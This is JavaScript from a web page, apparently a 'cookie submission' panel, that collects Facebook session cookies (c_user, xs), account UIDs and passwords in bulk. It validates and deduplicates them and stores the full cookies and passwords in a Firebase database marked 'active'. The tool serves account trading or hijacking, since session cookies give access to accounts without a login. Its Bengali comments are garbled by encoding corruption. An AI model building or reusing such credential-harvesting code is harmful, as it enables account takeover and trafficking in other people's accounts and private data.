    // ‡¶§‡¶æ‡¶∞‡¶ø‡¶ñ ‡¶∏‡¶ø‡¶∏‡ßç‡¶ü‡ßá‡¶Æ (‡¶Ü‡¶ó‡ßá‡¶∞ ‡¶Æ‡¶§)
    // -------------------------------
    function getTodayDate() {
      return new Date().getDate().toString();
    }

    const TODAY_DATE = getTodayDate();
    currentDateElement.textContent = TODAY_DATE;

    // -------------------------------
    // ‡¶ï‡ßÅ‡¶ï‡¶ø ‡¶™‡¶æ‡¶∞‡ßç‡¶∏‡¶æ‡¶∞ ‡¶ì ‡¶≠‡ßç‡¶Ø‡¶æ‡¶≤‡¶ø‡¶°‡ßá‡¶ü‡¶∞
    // -------------------------------
    function parseCookieString(cookieStr) {
      const cookies = {};
      cookieStr.split(';').forEach(pair => {
        const [key, ...valArr] = pair.trim().split('=');
        if (key && valArr.length) cookies[key.trim()] = valArr.join('=').trim();
      });
      return cookies;
    }

    function validateCookie(cookieStr) {
      const cookies = parseCookieString(cookieStr);
      const c_user = cookies.c_user || '';
      const xs = cookies.xs || '';
      
      if (!c_user) return { valid: false, error: 'c_user missing' };
      if (!xs) return { valid: false, error: 'xs missing' };
      if (!/^\d{8,20}$/.test(c_user)) return { valid: false, error: `Invalid c_user: ${c_user}` };
      
      return { valid: true, c_user, xs, fullCookie: cookieStr };
    }

    // -------------------------------
    // ‡¶°‡ßÅ‡¶™‡ßç‡¶≤‡¶ø‡¶ï‡ßá‡¶ü ‡¶ö‡ßá‡¶ï (c_user|xs)
    // -------------------------------
    let cookieCache = new Set();
    let cacheTimestamp = 0;
    const CACHE_DURATION = 30000;

    async function checkDuplicateCookies(cookieEntries) {
      try {
        const now = Date.now();
        if (now - cacheTimestamp > CACHE_DURATION || cookieCache.size === 0) {
          const snapshot = await db.ref(USED_COOKIE_PATH).once('value');
          const used = snapshot.val() || {};
          cookieCache = new Set(Object.keys(used).map(k => `${used[k].c_user}|${used[k].xs}`));
          cacheTimestamp = now;
        }
        
        const unique = [], duplicates = [];
        for (const entry of cookieEntries) {
          const key = `${entry.c_user}|${entry.xs}`;
          if (cookieCache.has(key)) duplicates.push(entry);
          else { unique.push(entry); cookieCache.add(key); }
        }
        return { unique, duplicates, error: null };
      } catch (error) {
        return { unique: [], duplicates: [], error: error.message };
      }
    }

    // -------------------------------
    // ‡¶∏‡¶¨ ‡¶á‡¶®‡¶™‡ßÅ‡¶ü ‡¶≠‡ßç‡¶Ø‡¶æ‡¶≤‡¶ø‡¶°‡ßá‡¶∂‡¶®
    // -------------------------------
    function validateInputs(uids, passwords, cookieStrings) {
      const errors = [];

      // UID (‡¶ê‡¶ö‡ßç‡¶õ‡¶ø‡¶ï)
      const validUIDs = uids.filter(uid => {
        if (!uid) return false;
        if (!/^\d{8,16}$/.test(uid)) {
          errors.push(`Invalid UID: ${uid} (must be 8-16 digits)`);
          return false;
        }
        return true;
      });

      // Password (‡¶ê‡¶ö‡ßç‡¶õ‡¶ø‡¶ï)
      const validPasswords = passwords.filter(pwd => {
        if (!pwd) return false;
        if (!pwd.includes(TODAY_DATE)) {
          errors.push(`Password must contain today's date (${TODAY_DATE})`);
          return false;
        }
        return true;
      });

      // Cookie (‡¶¨‡¶æ‡¶ß‡ßç‡¶Ø‡¶§‡¶æ‡¶Æ‡ßÇ‡¶≤‡¶ï)
      if (cookieStrings.length === 0) {
        errors.push('At least one cookie is required');
        return { valid: false, errors, validUIDs, validPasswords, validCookies: [] };
      }

      const validCookies = [];
      cookieStrings.forEach((cookie, i) => {
        const res = validateCookie(cookie);
        if (res.valid) validCookies.push(res);
        else errors.push(`Cookie line ${i+1}: ${res.error}`);
      });

      if (validCookies.length === 0) errors.push('No valid cookies found');

      return {
        valid: errors.length === 0,
        errors,
        validUIDs,
        validPasswords,
        validCookies
      };
    }

    // -------------------------------
    // Firebase-‡¶è ‡¶∏‡ßá‡¶≠
    // -------------------------------
    async function saveToFirebase(validCookies, validUIDs, validPasswords) {
      try {
        const timestamp = new Date().toISOString();
        const batch = {};
        const usedUpdate = {};
        let savedCount = 0;

        validCookies.forEach((cookie, i) => {
          const submissionId = `cookie_${Date.now()}_${cookie.c_user}_${i}`;
          const path = `${SUBMISSIONS_PATH}/${submissionId}`;
          
          const uidFromCookie = cookie.c_user;
          const matchedUID = (validUIDs.length > i) ? validUIDs[i] : uidFromCookie;
          const matchedPassword = (validPasswords.length > i) ? validPasswords[i] : '';

          batch[path] = {
            c_user: cookie.c_user,
            xs: cookie.xs,
            full_cookie: cookie.fullCookie,
            uid: matchedUID,
            password: matchedPassword,
            submitted_at: timestamp,
            date_used: TODAY_DATE,
            source: 'EBH_COOKIE_MOBILE',
            status: 'active',
            user_agent: navigator.userAgent,
            platform: navigator.platform
          };

          const usedKey = `${cookie.c_user}|${cookie.xs}`.replace(/[.#$[\]]/g, '_');
          usedUpdate[`${USED_COOKIE_PATH}/${usedKey}`] = {
            c_user: cookie.c_user,
            xs: cookie.xs,
            first_used: timestamp,
            last_used: timestamp,
            submission_id: submissionId
          };

          savedCount++;
        });

        if (savedCount > 0) {
          await Promise.all([
            db.ref().update(batch),
            db.ref().update(usedUpdate)
          ]);
        }

        return { success: true, savedCount };
      } catch (error) {
        return { success: false, savedCount: 0, error: error.message };
      }
    }

    // -------------------------------
    // ‡¶™‡¶™‡¶Ü‡¶™ ‡¶´‡¶æ‡¶Ç‡¶∂‡¶® (‡¶Ü‡¶ó‡ßá‡¶∞ ‡¶Æ‡¶§)
    // -------------------------------
    function showPopup(type, title, message, details, duplicates = []) {
      popupTitle.textContent = title;
      popupTitle.className = 'popup-header ' + type;
      popupMessage.textContent = message;
      
      if (details) {
        resultDetails.innerHTML = details;
        resultDetails.style.display = 'block';
      } else resultDetails.style.display = 'none';

      popupDuplicateList.innerHTML = '';
      if (duplicates.length > 0) {
        const titleDiv = document.createElement('div');
        titleDiv.className = 'duplicate-title';
        titleDiv.textContent = `Duplicate Cookies (${duplicates.length}):`;
        popupDuplicateList.appendChild(titleDiv);
        duplicates.forEach(d => {
          const div = document.createElement('div');
          div.className = 'duplicate-item';
          div.textContent = `c_user: ${d.c_user}`;
          popupDuplicateList.appendChild(div);
        });
      }

      popupOverlay.classList.add('active');
      document.body.style.overflow = 'hidden';
    }

    function hidePopup() {
      popupOverlay.classList.remove('active');
      document.body.style.overflow = 'auto';
    }

    function createResultDetails(total, saved, duplicates, validCount) {
      return `
        <div class="result-item"><span class="result-label">üì• Total Cookies:</span><span class="result-value">${total}</span></div>
        <div class="result-item"><span class="result-label">‚úÖ Valid:</span><span class="result-value success">${validCount}</span></div>
        <div class="result-item"><span class="result-label">üíæ Saved:</span><span class="result-value success">${saved}</span></div>
        <div class="result-item"><span class="result-label">‚ö†Ô∏è Duplicates:</span><span class="result-value">${duplicates}</span></div>
        <div class="result-item"><span class="result-label">üóìÔ∏è Date:</span><span class="result-value">${TODAY_DATE}</span></div>
      `;
    }

    // -------------------------------
    // ‡¶∏‡¶æ‡¶¨‡¶Æ‡¶ø‡¶ü ‡¶π‡ßç‡¶Ø‡¶æ‡¶®‡ßç‡¶°‡¶≤‡¶æ‡¶∞ (‡¶Æ‡ßÇ‡¶≤ ‡¶≤‡¶ú‡¶ø‡¶ï)
    // -------------------------------
    async function handleSubmission() {
      try {
        // ‡¶á‡¶®‡¶™‡ßÅ‡¶ü ‡¶®‡ßá‡¶ì‡ßü‡¶æ
        const uids = uidInput.value.split(/\r?\n/).map(u => u.trim()).filter(u => u !== '');
        const passwords = passwordInput.value.split(/\r?\n/).map(p => p.trim()).filter(p => p !== '');
        const cookieStrings = cookieInput.value.split(/\r?\n/).map(c => c.trim()).filter(c => c !== '');

        // ‡¶ï‡ßÅ‡¶ï‡¶ø ‡¶ö‡ßá‡¶ï
        if (cookieStrings.length === 0) {
          showPopup('error', '‚ùå Input Error', 'Please enter at least one Facebook cookie!');
          return;
        }

        // ‡¶¨‡¶æ‡¶ü‡¶® ‡¶°‡¶ø‡¶ú‡ßá‡¶¨‡¶≤
        submitBtn.disabled = true;
        submitBtn.innerHTML = '‚è≥ PROCESSING...';
        showPopup('warning', '‚è≥ Processing', 'Validating cookies...');

        // 1. ‡¶≠‡ßç‡¶Ø‡¶æ‡¶≤‡¶ø‡¶°‡ßá‡¶∂‡¶®
        const validation = validateInputs(uids, passwords, cookieStrings);
        if (!validation.valid) {
          const errMsg = validation.errors.slice(0, 3).join('\n');
          const details = createResultDetails(cookieStrings.length, 0, 0, 0);
          showPopup('error', '‚ùå Validation Failed', errMsg, details);
          submitBtn.disabled = false;
          submitBtn.innerHTML = 'üç™ SUBMIT COOKIE';
          return;
        }

        // 2. ‡¶°‡ßÅ‡¶™‡ßç‡¶≤‡¶ø‡¶ï‡ßá‡¶ü ‡¶ö‡ßá‡¶ï
        showPopup('warning', 'üîç Checking', 'Checking for duplicate cookies...');
        const { unique, duplicates, error } = await checkDuplicateCookies(validation.validCookies);
        if (error) {
          showPopup('error', '‚ùå Database Error', error);
          submitBtn.disabled = false;
          submitBtn.innerHTML = 'üç™ SUBMIT COOKIE';
          return;
        }

        if (unique.length === 0) {
          const details = createResultDetails(cookieStrings.length, 0, duplicates.length, validation.validCookies.length);
          showPopup('warning', '‚ö†Ô∏è All Duplicates', `All ${duplicates.length} cookies already exist.`, details, duplicates);
          submitBtn.disabled = false;
          submitBtn.innerHTML = 'üç™ SUBMIT COOKIE';
          return;
        }

        // 3. Firebase-‡¶è ‡¶∏‡ßá‡¶≠
        showPopup('warning', 'üíæ Saving', `Saving ${unique.length} new cookies...`);
        const saveResult = await saveToFirebase(unique, validation.validUIDs, validation.validPasswords);

        if (saveResult.success) {
          const details = createResultDetails(
            cookieStrings.length,
            saveResult.savedCount,
            duplicates.length,
            validation.validCookies.length
          );
          const msg = `‚úÖ Successfully saved ${saveResult.savedCount} new cookies!` + 
                     (duplicates.length ? ` (${duplicates.length} duplicates skipped)` : '');
          showPopup('success', 'üéâ SUBMISSION SUCCESSFUL!', msg, details, duplicates);
          
          // ‡¶ï‡ßÅ‡¶ï‡¶ø ‡¶á‡¶®‡¶™‡ßÅ‡¶ü ‡¶ï‡ßç‡¶≤‡¶ø‡ßü‡¶æ‡¶∞ (‡¶Ö‡¶™‡¶∂‡¶®‡¶æ‡¶≤)
          // cookieInput.value = '';
        } else {
          showPopup('error', '‚ùå Save Failed', saveResult.error || 'Unknown error');
        }

      } catch (error) {
        showPopup('error', '‚ùå System Error', error.message);
      } finally {
        setTimeout(() => {
          submitBtn.disabled = false;
          submitBtn.innerHTML = 'üç™ SUBMIT COOKIE';
        }, 1000);
      }
    }

    // -------------------------------
    // ‡¶á‡¶≠‡ßá‡¶®‡ßç‡¶ü ‡¶≤‡¶ø‡¶∏‡ßá‡¶®‡¶æ‡¶∞
    // -------------------------------
    submitBtn.addEventListener('click', handleSubmission);
    popupConfirm.addEventListener('click', hidePopup);
    popupOverlay.addEventListener('click', (e) => e.target === popupOverlay && hidePopup());
    
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape' && popupOverlay.classList.contains('active')) hidePopup();
      if (e.ctrlKey && e.key === 'Enter' && !submitBtn.disabled) {
        e.preventDefault();
        submitBtn.click();
      }
    });

    // ‡¶™‡ßç‡¶∞‡¶§‡¶ø ‡¶Æ‡¶ø‡¶®‡¶ø‡¶ü‡ßá ‡¶§‡¶æ‡¶∞‡¶ø‡¶ñ ‡¶ö‡ßá‡¶ï
    setInterval(() => {
      if (getTodayDate() !== TODAY_DATE) location.reload();
    }, 60000);

    // ‡¶´‡ßã‡¶ï‡¶æ‡¶∏
    setTimeout(() => uidInput.focus(), 300);

    console.log("üç™ EBH COOKIE SYSTEM READY (Mobile Edition)");
    console.log("üìÖ Today:", TODAY_DATE);
  </script>
